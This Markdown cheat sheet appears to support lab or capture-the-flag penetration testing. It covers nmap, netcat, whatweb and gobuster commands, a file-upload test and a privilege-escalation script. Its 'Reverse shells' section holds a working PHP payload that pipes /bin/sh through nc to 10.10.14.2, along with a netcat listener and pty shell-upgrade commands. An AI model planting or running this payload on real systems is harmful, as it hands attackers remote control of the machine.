
## Nmap:

### [Nmap man pages](https://linux.die.net/man/1/nmap)

<table>
<tr><th>Function</th><th>Examples:</th></tr>
<tr><td>

|Flag: | What it does:|
|----------|----------|
|`-sV`| scan against the default top 1000 ports
|`--open`| scan only open ports|
|`-oA <filename>`| output all scan formats|
|`-v`| verbose output|
|`-p-`| full TCP port scan (65535)|
|`--script=<script_name>`|script scan|
|<li>`banner`|A simple banner grabber which connects <br>to an open TCP port and prints out anything <br>sent by the listening service within five seconds|
|<li>`http-enum`|Enumerates directories used by <br>popular web applications and servers|


</td><td>

|Full command:|
|----------|
|`nmap -sV --open -oA <filename> <ip address>`|
|**Quick scan**|
|`nmap -p- --open -oA <filename> <ip address>`|
|**Long scan - recommended in second terminal**|

</td></tr> </table>

## NetCat

### [NetCat man pages](https://linux.die.net/man/1/nc)

<table>
<tr><th>Function</th><th>Examples:</th></tr>
<tr><td>

|Flag: | What it does:|
|----------|----------|
|`-n`| do not do any DNS or service lookups on any specified addresses, <br>hostnames and ports (don't resolve)|
|`-v`| verbose|
|`-l`| listen for incoming connection rather than initiate a connection|

</td><td>

|Full command:|
|----------|
|`nc -nv <ip address> <port>`|
|Confirm banner|
|`nc -nvlp 80`|
|Listening shell on port 80|

</td></tr> </table>

## whatweb 

### [whatweb man pages](https://manpages.org/whatweb)

<table>
<tr><th>Function</th><th>Examples:</th></tr>
<tr><td>

|Flag: | What it does:|
|----------|----------|
|``| |
|``| |

</td><td>

|Full command:|
|----------|
|`whatweb <ip address>`|
|Identify web application in use|

</td></tr> </table>

## Gobuster

### [Gobuster man pages](https://linuxcommandlibrary.com/man/gobuster)

<table>
<tr><th>Function</th><th>Examples:</th></tr>
<tr><td>

|Flag: | What it does:|
|----------|----------|
|`dir`| use directory enumeration mode |
|`-u`| string, the target URL or Domain |
|`--wordlist` / `-w`| path to wordlist, recommended:<br> `/usr/share/wordlists/dirb/common.txt`  
|`-e`|print full URLs|

</td><td>

|Full command:|
|----------|
|`gobuster -e -u <ip address/URL> -w /usr/share/wordlists/dirb/common.txt`|
|Scan website, use common.txt wordlist and print the full <br>URLs of discovered paths|

</td></tr> </table>

## File upload testing

|File: | What it does/testing:|
|----------|----------|
|[test_php.php](/assets/files/test_php.php)|Tests if php file can be uploaded to web app|

## Reverse shells:

```php 
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?> 
``` 
## Upgrade reverse shell

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege escalation checks

|File: | What it does/testing:|
|----------|----------|
|[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)|Automated privilege escalation checks|

## Start Python HTTP server
```python
sudo python3 -m http.server 8080
```